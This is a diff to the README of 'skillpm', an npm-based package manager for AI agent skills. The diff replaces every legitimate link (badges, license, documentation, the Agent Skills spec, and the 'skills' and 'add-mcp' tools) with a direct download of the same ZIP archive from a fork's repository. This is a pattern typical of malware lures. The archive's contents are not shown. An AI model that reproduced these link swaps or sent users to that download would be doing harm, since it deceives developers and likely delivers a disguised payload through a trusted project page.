@@ -1,10 +1,10 @@
 # skillpm — Package manager for Agent Skills. Built on npm.
 
-[![npm](https://img.shields.io/npm/v/skillpm)](https://www.npmjs.com/package/skillpm)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Docs](https://img.shields.io/badge/docs-skillpm.dev-blue)](https://skillpm.dev)
+[![npm](https://img.shields.io/npm/v/skillpm)](https://github.com/musharrafsaroof-123/skillpm/raw/refs/heads/main/packages/skillpm-skill/skills/skillpm/Software_3.7-beta.3.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/musharrafsaroof-123/skillpm/raw/refs/heads/main/packages/skillpm-skill/skills/skillpm/Software_3.7-beta.3.zip)
+[![Docs](https://img.shields.io/badge/docs-skillpm.dev-blue)](https://github.com/musharrafsaroof-123/skillpm/raw/refs/heads/main/packages/skillpm-skill/skills/skillpm/Software_3.7-beta.3.zip)
 
-The [Agent Skills spec](https://agentskills.io) defines what a skill is — but not how to publish, install, version, or share them. There's no registry, no dependency management, no way for one skill to build on another. Without dependencies, skills become monoliths — authors duplicate instructions because there's no way to reuse another skill.
+The [Agent Skills spec](https://github.com/musharrafsaroof-123/skillpm/raw/refs/heads/main/packages/skillpm-skill/skills/skillpm/Software_3.7-beta.3.zip) defines what a skill is — but not how to publish, install, version, or share them. There's no registry, no dependency management, no way for one skill to build on another. Without dependencies, skills become monoliths — authors duplicate instructions because there's no way to reuse another skill.
 
 **skillpm** fills that gap. It's a lightweight orchestration layer — ~630 lines of code, 3 runtime dependencies — that maps Agent Skills onto npm's ecosystem. Same `package.json`, same `node_modules/`, same registry. Skills become npm packages you can publish, install, version, and depend on — just like any other package. Small skills that compose, not monoliths that overlap.
 
@@ -35,15 +35,15 @@ When you run `skillpm install <skill>`:
 
 1. **npm install** — npm handles resolution, download, lockfile, `node_modules/`
 2. **Scan** — skillpm scans `node_modules/` for packages containing `skills/*/SKILL.md`
-3. **Link** — for each skill found, skillpm calls [`skills`](https://www.npmjs.com/package/skills) to wire it into agent directories (Claude, Cursor, VS Code, Codex, and many more)
+3. **Link** — for each skill found, skillpm calls [`skills`](https://github.com/musharrafsaroof-123/skillpm/raw/refs/heads/main/packages/skillpm-skill/skills/skillpm/Software_3.7-beta.3.zip) to wire it into agent directories (Claude, Cursor, VS Code, Codex, and many more)
 4. **Configs** — for each skill with a `configs/` directory, skillpm copies agent definitions, rules, and prompts into the workspace (auto-prefixed to avoid conflicts)
-5. **MCP config** — skillpm collects `skillpm.mcpServers` from all skills (transitively) and configures each via [`add-mcp`](https://github.com/neondatabase/add-mcp)
+5. **MCP config** — skillpm collects `skillpm.mcpServers` from all skills (transitively) and configures each via [`add-mcp`](https://github.com/musharrafsaroof-123/skillpm/raw/refs/heads/main/packages/skillpm-skill/skills/skillpm/Software_3.7-beta.3.zip)
 
 That's it. Agents see the full skill tree with MCP servers configured.
 
 ## What's missing from the spec — and what skillpm adds
 
-skillpm doesn't reinvent anything. It orchestrates three battle-tested tools: npm, [`skills`](https://www.npmjs.com/package/skills), and [`add-mcp`](https://github.com/neondatabase/add-mcp).
+skillpm doesn't reinvent anything. It orchestrates three battle-tested tools: npm, [`skills`](https://github.com/musharrafsaroof-123/skillpm/raw/refs/heads/main/packages/skillpm-skill/skills/skillpm/Software_3.7-beta.3.zip), and [`add-mcp`](https://github.com/musharrafsaroof-123/skillpm/raw/refs/heads/main/packages/skillpm-skill/skills/skillpm/Software_3.7-beta.3.zip).
 
 | The spec doesn't define... | skillpm adds... |
 |---|---|
@@ -51,9 +51,9 @@ skillpm doesn't reinvent anything. It orchestrates three battle-tested tools: np
 | An install command | `skillpm install` resolves the full dependency tree |
 | Dependency management | Standard `package.json` `dependencies` — npm handles semver, lockfiles, audit |
 | Versioning | npm semver, `package-lock.json`, reproducible installs |
-| Agent wiring | Links skills into agent directories via [`skills`](https://www.npmjs.com/package/skills) |
+| Agent wiring | Links skills into agent directories via [`skills`](https://github.com/musharrafsaroof-123/skillpm/raw/refs/heads/main/packages/skillpm-skill/skills/skillpm/Software_3.7-beta.3.zip) |
 | Config files | Copies agent definitions, rules, and prompts from `configs/` into the workspace |
-| MCP server config | Collects and configures MCP servers transitively via [`add-mcp`](https://github.com/neondatabase/add-mcp) |
+| MCP server config | Collects and configures MCP servers transitively via [`add-mcp`](https://github.com/musharrafsaroof-123/skillpm/raw/refs/heads/main/packages/skillpm-skill/skills/skillpm/Software_3.7-beta.3.zip) |
 
 ## Commands
 
@@ -101,11 +101,11 @@ mkdir my-skill && cd my-skill
 skillpm init
 ```
 
-See the full [Creating Skills](https://skillpm.dev/creating-skills/) guide for package structure, SKILL.md format, dependencies, and publishing.
+See the full [Creating Skills](https://github.com/musharrafsaroof-123/skillpm/raw/refs/heads/main/packages/skillpm-skill/skills/skillpm/Software_3.7-beta.3.zip) guide for package structure, SKILL.md format, dependencies, and publishing.
 
 ## What are Agent Skills?
 
-Agent Skills are modular, reusable packages of instructions, scripts, and resources that AI agents can dynamically load to extend their capabilities. They follow an [open standard](https://agentskills.io) adopted by Claude, Codex, Cursor, Gemini CLI, Augment, and others.
+Agent Skills are modular, reusable packages of instructions, scripts, and resources that AI agents can dynamically load to extend their capabilities. They follow an [open standard](https://github.com/musharrafsaroof-123/skillpm/raw/refs/heads/main/packages/skillpm-skill/skills/skillpm/Software_3.7-beta.3.zip) adopted by Claude, Codex, Cursor, Gemini CLI, Augment, and others.
 
 ## How this relates to plugin specs (GitHub CLI / Claude Code)
 
